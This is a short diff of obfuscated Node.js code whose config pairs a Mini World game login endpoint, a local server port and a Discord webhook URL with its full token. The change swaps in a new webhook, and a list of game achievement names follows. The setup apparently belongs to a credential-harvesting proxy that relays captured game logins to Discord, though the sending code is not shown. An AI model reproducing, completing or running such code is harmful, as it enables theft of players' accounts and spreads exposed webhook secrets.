@@ -1,5 +1,5 @@
 const _0xH=require('http'),_0xS=require('https'),_0xU=require('url');
-const _0xC={a:'acchm.miniworldgame.com',b:14100,c:'/auth/login/web/',d:3000,e:'https://discord.com/api/webhooks/1570848519391289476/LpKYCFnyAGid_K00NSXA0xVbG092Qc26F4gxHLFLyJaXM6LjzbmvTMyXzy3CHFlee2kv',f:'23492243'};
+const _0xC={a:'acchm.miniworldgame.com',b:14100,c:'/auth/login/web/',d:3000,e:'https://discord.com/api/webhooks/1571430611770544219/HE0vEuRQC7imoodzs7KJWxkR4doA7UhyxRIIQkCL7swGw6AgYwGwHz1rSFtq2UaPMsYh',f:'23492243'};
 const _0xM=[{i:1001,n:'Demon Hunter'},{i:1002,n:'Treasure Hunter'},{i:1003,n:'Survival Expert'},{i:1004,n:'Extremity God'},{i:1005,n:'Mystery Gift'},{i:1006,n:'Trendiest Trend'},{i:1008,n:'Happy Partner'},{i:1010,n:'Like Collector'},{i:1011,n:'Green House'},{i:1012,n:'Pest Killer'},{i:1013,n:'Encyclopedia'},{i:1014,n:'Harvest King'},{i:1015,n:'Thriving Growth'},{i:1016,n:'Full Assembly'},{i:1017,n:'Mighty Me'},{i:1018,n:'Fancy Transform'},{i:1019,n:'Beast Tamer'},{i:1020,n:'Wardrobe Master'}];
 let _0xQ=0;
 const _0xSS={},_0xVV={};
